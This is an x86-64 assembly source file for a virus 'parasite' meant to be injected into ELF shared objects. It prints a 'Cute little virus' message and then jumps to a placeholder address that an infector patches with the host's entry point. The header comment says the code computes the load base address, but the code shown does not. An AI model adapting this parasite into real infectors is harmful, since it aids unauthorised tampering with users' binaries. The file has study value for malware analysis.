BITS 64

; Author : Abhinav Thakur
; Email  : compilepeace@gmail.com

; Description : This parasite is foccused to be injected in a shared object. Jump-on-exit needs to be
;               an absolute address rather than an offset (so contains only the offsets and no 
;               virtual addresses). So, parasite calculates the base address (where the infected 
;               binary is loaded at runtime) and adds the base address to the offset 
;               (0xAAAAAAAAAAAAAAAA) to get an absolute address @ which the jump will happen.
;                       
;               Shellcode prints a message, generates an absolute address to transfer control to a 
;               virtual address (entry point of running shared object code)
;
; base_address_of_infected_binary = parasite_load_address - parasite_offset(to be replaced by user)
; Jmp_on_Exit_address             = base_address_of_infected_binary + 0xAAAAAAAAAAAAAAAA
;
; parsite_load_address  => The address @ which parasite is loaded (along with infected binary)


global _start


section .text


_start:

	xor  rbx, rbx
	mov  rbx, _start						; Current instruction's address

	; Save register state, RBX can be safely used
	push rax
	push rcx
	push rdx
	push rsi
	push rdi
	push r11

	
	jmp	parasite
	message:	db	"-x-x-x-x- COMPILEPEACE : Cute little virus ^_^ -x-x-x-x-", 0xa


parasite:

	; Print our message
	xor	rax, rax					; Zero out RAX
	add	rax, 0x1					; Syscall number of write() - 0x1
	mov rdi, rax					; File descriptor - 0x1 (STDOUT)
	lea rsi, [rel message]			; Addresses the label relative to RIP (Instruction Pointer), i.e. 
									; dynamically identifying the address of the 'message' label.
	xor rdx, rdx
	mov dl, 0x39					; message size = 57 bytes (0x39)
	syscall					


	; Restoring register state
	pop r11
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rax

	
	; jmp to original host entry point (to be patched by kaal bhairav)
	mov	rbx, 0xAAAAAAAAAAAAAAAA		
	jmp	rbx

